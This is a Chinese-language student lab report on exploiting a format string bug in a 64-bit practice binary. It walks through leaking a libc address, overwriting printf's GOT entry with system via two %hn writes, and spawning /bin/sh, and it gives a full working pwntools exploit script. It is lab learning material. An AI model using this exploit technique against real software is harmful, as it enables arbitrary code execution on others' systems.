# 格式化字符串漏洞实验报告

## 考点

- 格式化字符串漏洞利用
- 对64程序与32位程序区别的理解
- 覆写got表地址

## 实验过程

- 使用checksec, file, ldd等命令查看程序信息：

![基本信息](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\format_string\images\基本信息.png)

​		可见程序为64位，启动了DEP保护，动态链接。

- 使用patchelf修改libc文件。

![patchelf](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\format_string\images\patchelf.png)

- 使用ida库打开程序，反编译。

![main](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\format_string\images\main.png)

​		可以发现`printf(buf)`代码存在格式化字符串漏洞。

- 构造python脚本进行gdb调试：

```python
from pwn import *

context(arch="amd64", log_level="debug")
p = process("./format_string")

payload = flat(b"%1$p")
gdb.attach(p, "b *0x4006AD")
p.sendlineafter("Format String\n", payload)

p.interactive()
```

​		`%1$p`表示输出第一个参数的指针形式输出![gdb](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\format_string\images\gdb.png)

​		查看栈中情况，可以发现`_libc_stat_main+240`地址，计算得到该地址为第26个参数（64位程序需要注意前6个参数会在寄存器中）。因此要泄漏`libc`地址，可以利用`%25$p`。

- 获取libc基址后，可以获取libc中的`system`函数地址。然后可以通过修改printf函数got表的方式来使程序在执行`printf`函数转去执行`system`函数，并且以输入`"/bin/sh"`字符串达到执行函数`system("/bin/sh")`的目的。
- 由于64位程序中函数地址高位为`\x00`，因此会导致printf函数输出时截断，所以构造payload时printf函数地址需要放在末尾，然后由于64位地址如果使用`%n`直接对整体进行修改的话，会造成printf输出字符数目过大，耗时且易崩溃。所以考虑使用`%hn`来进行两字节的修改。
- 构造payload，根据system函数的地址分两次修改。

```python
# flag: tmp1 < tmp2时为True
# tmp1: 高两字节， tmp2: 低两字节
if flag == True:
    fmt = flat(b'%', tmp1, b'c', b'%10$hn', b'%', tmp2, b'c%11$hn')
    fmt = fmt.ljust(32, b'a')
    payload = flat(fmt, printf_got+2, printf_got)
else:
    fmt = flat(b'%', tmp2, b'c', b'%11$hn', b'%', tmp1, b'c%10$hn')
    fmt = fmt.ljust(32, b'a')
    payload = flat(fmt, printf_got, printf_got+2)
```

​		发送payload后栈情况：

![payload-gdb](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\format_string\images\payload-gdb.png)

​		执行printf函数后，可见printf函数got表地址已被修改为system函数地址，然后输入`"/bin/sh"`字符串，即可返回shell。

![payload-gdb-1](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\format_string\images\payload-gdb-1.png)

- 最终python脚本如下：

```python
from pwn import *

context(arch="amd64", log_level="debug")
p = process("./format_string")

# 获取read函数在libc中偏移
libc = ELF("./libc-2.23.so")
system_offset = libc.symbols['system']

# 泄漏libc地址
payload = flat(b'%25$p')
gdb.attach(p, 'b *0x4006AD')
p.sendlineafter("Format String\n", payload)
libc_addr = int(p.recvline(), 16) - 0x20840  # 0x20840
success(hex(libc_addr))

system_addr = libc_addr + system_offset
print(hex(system_addr))

flag = True
tmp = str(hex(system_addr))
print(tmp)
tmp1 = tmp[6:10]
tmp2 = tmp[10:14]
tmp1 = int(tmp1, 16)
tmp2 = int(tmp2, 16)
if tmp1 > tmp2:
    flag = False
    tmp1 = tmp1 - tmp2
else:
    flag = True
    tmp2 = tmp2 - tmp1
print(tmp1)
print(tmp2)
tmp1 = str(tmp1)
tmp2 = str(tmp2)


# 修改got表
elf = ELF("./format_string")
printf_got = elf.got["printf"]
print(printf_got)
if flag == True:
    fmt = flat(b'%', tmp1, b'c', b'%10$hn', b'%', tmp2, b'c%11$hn')
    fmt = fmt.ljust(32, b'a')
    payload = flat(fmt, printf_got+2, printf_got)
else:
    fmt = flat(b'%', tmp2, b'c', b'%11$hn', b'%', tmp1, b'c%10$hn')
    fmt = fmt.ljust(32, b'a')
    payload = flat(fmt, printf_got, printf_got+2)

p.send(payload)

# 发送"/bin/sh"字符串
payload = flat(b"/bin/sh")
p.send(payload)

p.interactive()
```



## 结果

![result](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\format_string\images\result.png)